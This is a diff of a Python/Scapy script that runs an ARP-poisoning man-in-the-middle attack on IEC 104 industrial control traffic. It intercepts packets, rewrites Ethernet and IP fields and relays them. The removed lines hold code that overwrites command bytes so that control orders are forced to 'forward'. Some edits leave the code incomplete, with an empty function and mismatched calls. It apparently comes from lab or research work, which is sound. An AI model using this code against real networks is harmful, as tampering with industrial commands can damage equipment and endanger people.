@@ -13,19 +13,12 @@ ip_attack = ARP_poisoning.get_ipsrc()
 mac_router=ARP_poisoning.get_mac(ip_router)
 mac_target=ARP_poisoning.get_mac(ip_target)
 
-interface = "eno1"
+interface = "en0"
 
-## Def vars for our needed paquets
 
-LENGTH_APCI=6
-ASDU_TYPE_BYTE=1
-ASDU_ACT_ORDER_VALUE_BYTE=9
-ASDU_ACT_ORDER_VALUE_LENGTH=2
+def reconstructing_packet (chosen_packet):
 
-ASDU_TYPE_ACT_CHAR="\x31"
-ASDU_ACT_ORDER_STOP_VALUE_STR="\x00\x00"
-ASDU_ACT_ORDER_BACKWARDS_VALUE_STR="\x07\x00"
-ASDU_ACT_ORDER_FORWARD_VALUE_STR="\xe7\x00"
+
 
 def modify_packet_for_target(chosen_packet) :
 	chosen_packet[Ether].src = chosen_packet[Ether].dest
@@ -44,17 +37,7 @@ def modify_packet_for_router(chosen_packet) :
 	del chosen_packet[TCP].chksum
 
 def modify_mesure_packet(chosen_packet):
-	#get a list of bytes from the payload
-	copied_packet_payload_list=list(str(chosen_packet[TCP].payload))
-	print("\t before : "+"".join(copied_packet_payload_list).encode("hex"))
-	#modify the 2bytes to the FORWARD value
-	copied_packet_payload_list[LENGTH_APCI+ASDU_ACT_ORDER_VALUE_BYTE:LENGTH_APCI+ASDU_ACT_ORDER_VALUE_BYTE+ASDU_ACT_ORDER_VALUE_LENGTH]=ASDU_ACT_ORDER_FORWARD_VALUE_STR
-	new_payload="".join(copied_packet_payload_list)
-	#put the changed payload in the original packet
-	chosen_packet[TCP].payload=Raw(new_payload)
-	print("\t after  : "+new_payload.encode("hex"))
 
-	#print(chosen_packet.show2())
 
 
 def is_packet_containing_apci(packet):
@@ -87,7 +70,8 @@ def mitm(chosen_packet):
 
 	if(chosen_packet[Ether].src == mac_router and chosen_packet[IP].src==ip_router and chosen_packet[IP].dst==ip_target):
 		modify_packet_for_target(chosen_packet)
-		if is_packet_mesure_packet():
+		new_packet = reconstructing_packet(chosen_packet)
+		if is_packet_mesure_packet(new_packet):
 			modify_mesure_packet(chosen_packet)
 
 		send(chosen_packet, verbose=False)
@@ -105,17 +89,16 @@ def loop_sleep():
 
 def main_sniff():
 
+	ARP_poisoning.stop_ip_forward()
 	print("MitM with sniffing & IEC 104 packet modification until ctrl-c")
 	sniff(prn=mitm, filter="ip")
 
-	start_ip_forward()
-	print("MitM with full forward until ctrl-c")
+	ARP_poisoning().start_ip_forward()
+	print("MitM with full forward until Keyboard Interruption")
 	loop_sleep()
 	print("")
-	stop_ip_forward()
+	ARP_poisoning.stop_ip_forward()
 
 if __name__ == "__main__":
-	ARP_poisoning.poisoning()
-	EchoIEC104Server.server()
     main_sniff()
 
